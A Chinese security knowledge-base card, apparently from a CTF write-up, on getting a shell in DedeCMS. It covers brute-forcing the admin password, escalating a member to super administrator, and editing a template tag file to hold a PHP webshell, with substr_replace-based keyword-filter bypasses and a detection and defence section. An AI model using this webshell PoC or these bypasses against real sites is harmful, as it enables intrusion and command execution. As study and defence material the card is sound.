---
id: web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass
title: DedeCMS 超级管理员模板标签源码编辑 getshell：substr_replace 动态构造 system 绕过恶意代码检测
type: scenario
domain: web
path: web/php/rce
technique: dedecms-template-tag-source-dynamic-function-waf-bypass
tags:
- php
- dedecms
- cms
- rce
- template
- waf-bypass
- privilege-escalation
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:17+08:00'
  notes: 已对照原文后台截图与 substr_replace payload 核对；修正管理员口令表述（图中 admin123）；PoC 未复跑。
url: /docs/web/php/rce/web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass/
draft: false
kb_aliases:
- DedeCMS 模板标签源码
- mynews.lib.php getshell
- substr_replace 绕过
- 动态函数 WAF 绕过
- DedeCMS 后台提权
- DedeCMS 模板代码执行
---

## 一句话结论

拿到 DedeCMS 后台后，先把普通会员提升为超级管理员，再在“模板管理 → 标签源码管理”里编辑 `include/taglib/mynews.lib.php` 写入 PHP 代码；当直接写 `system()` 被“当前页面中存在恶意代码”拦截时，用 `substr_replace("systxx","em",4)` 在运行时拼出 `system`，再以变量函数 `$a('cat /f*')` 执行，访问该标签文件即可读出 flag。

## 原理

- **后台入口与提权**：注册普通会员后，会员中心会展示其他会员用户名（如 `admin`、`Aa123456789`），用前台登录功能爆破得到管理员口令；但管理员账号被限制不能从前台登录（响应 JS 提示“管理员帐号不允许从前台登录”），于是改用 `/dede/` 后台登录。后台会员管理里，`Aa123456789` 可以把其他用户提升为“超级管理员”，把已注册的低权限会员提权后即可获得模板管理权限。
- **模板标签源码就是 PHP**：DedeCMS 的 `include/taglib/*.lib.php` 是标签实现文件，后台“标签源码碎片管理”允许直接编辑；文件位于 Web 根目录下且会被 PHP 解析，因此向其中写入 `<?php ... ?>` 就等于写 webshell。
- **WAF 检测**：直接提交 `<?php system('ls'); ?>` 时，DedeCMS 返回“DedeCMS提示：当前页面中存在恶意代码!”并回显被拦截的代码，说明它按字面匹配危险函数名（如 `system`）。
- **动态函数绕过**：`substr_replace("systxx","em",4)` 从下标 4 开始把 `"xx"` 替换成 `"em"`，结果字符串为 `"system"`；源码中不出现 `system(` 字面量，WAF 的字符串匹配看不到危险函数。PHP 的变量函数 `$a('cat /f*')` 在运行时把 `$a` 的值当函数名调用，于是执行 `system('cat /f*')`。
- **为什么可行**：安全检测停留在“源码文本里有没有危险函数名”这一层，而 PHP 支持字符串函数、变量函数、`create_function`、`call_user_func` 等动态调用；只要能在运行时构造出函数名，静态关键字黑名单就会失效。
- **完整链**：弱口令/用户名泄露 → 后台登录 → 会员提权到超级管理员 → 模板标签源码编辑 → `substr_replace` 构造 `system` → 访问 `/include/taglib/mynews.lib.php` → 命令回显 flag。

## 触发条件

- DedeCMS 后台可访问，且存在弱口令/用户名泄露，能登录后台。
- 后台会员管理允许高权限会员给其他用户提升权限（包括超级管理员），且提权后能进入模板管理。
- `include/taglib/*.lib.php` 可写、可被 Web 直接访问并由 PHP 解析。
- 恶意代码检测只做危险函数/关键字文本匹配，未做语法级分析或禁用动态函数。
- PHP 未禁用 `system` 等函数，或禁用列表可被变量函数绕过。

## 利用步骤

1. 注册普通会员，查看会员中心/“欢迎新朋友”等位置泄露的用户名（`admin`、`Aa123456789`）。
2. 用前台登录接口爆破口令；若提示管理员不能从前台登录，改走 `/dede/` 后台登录。
3. 在后台会员管理中，用高权限账号把已注册的普通会员提升为“超级管理员”。
4. 以提权后的账号进入“模板管理 → 标签源码碎片管理”，选择 `mynews.lib.php`（或任意可写标签文件）点“编辑”。
5. 先尝试 `<?php system('ls'); ?>` 确认被恶意代码检测拦截；再改为：
   ```php
   <?php
   $a = substr_replace("systxx", "em", 4);
   $a('cat /f*');
   ?>
   ```
6. 保存后直接访问 `/include/taglib/mynews.lib.php`，命令输出即 flag；也可换成反弹 shell、写文件或读配置。

## PoC

```php
<?php
$a = substr_replace("systxx", "em", 4);  // "systxx" -> "system"
$a('cat /f*');
?>
```

保存位置：后台“标签源码碎片管理 → mynews.lib.php → 编辑”，文件路径 `include/taglib/mynews.lib.php`。

原文实测：直接 `system('ls')` 被 “当前页面中存在恶意代码!” 拦截；用上述 `substr_replace` 版本保存后访问标签文件，成功执行命令并读出 flag。

## 变体与关联

- 变体：动态函数构造可用 `$a = 'sys'.'tem';`、`$a = str_rot13('flfgrz');`、`$a = base64_decode('c3lzdGVt');`、`call_user_func('system', ...)`、`create_function` 等；核心是运行时拼出函数名。
- 变体：模板文件换成 `include/taglib/*.lib.php` 中任意可编辑文件，或后台“模板管理”里的 `.htm` 模板（若允许 PHP）；也可结合模板上传/改名 getshell（见关联卡）。
- 变体：提权路径可换成后台任意“修改用户组/权限”的功能，或用弱口令直接拿到超级管理员。
- 关联：[[web-php-rce-dedecms-field-tag-runphp-stored-injection]]（DedeCMS 会员模型字段 `runphp=yes` 二阶模板注入）、[[web-generic-file-upload-dedecms-template-rename-php-waf-fileread]]（DedeCMS 模板上传改名 + `scandir/array_rand` 绕过）、[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（PHP 动态函数绕过 WAF/RASP）。
- 边界：若后台禁用了模板源码编辑、文件只读或 WAF 做语法级检测/禁用变量函数，本链不成立；原文图中爆破命中管理员口令 admin123；实际环境需按题面弱口令字典爆破。

## 检测与防御

- **权限**：后台强制强口令、二次认证、IP 白名单；不要把“提升用户权限”开放给非必要角色；超级管理员最小化。
- **文件**：生产环境移除模板源码编辑功能，`include/taglib/` 设为只读并做文件完整性监控；禁止 Web 直接访问 `.lib.php`。
- **WAF/检测**：不要只匹配 `system(`；同时检测变量函数 `$a(...)`、`substr_replace`、`str_rot13`、`base64_decode`、`call_user_func`、`create_function` 等动态调用组合，并对 PHP 代码做语法/AST 分析。
- **运行**：`disable_functions` 禁用 `system/exec/shell_exec/passthru/popen/proc_open`，但不要把它当唯一防线（变量函数可绕过）；使用 open_basedir 限制文件访问。
- **检测信号**：后台 `mynews.lib.php` 等标签文件被修改、内容含 `<?php`、`substr_replace`、变量函数；访问 `/include/taglib/*.lib.php` 返回命令输出；Web 进程派生 `cat`/`ls` 等子进程。
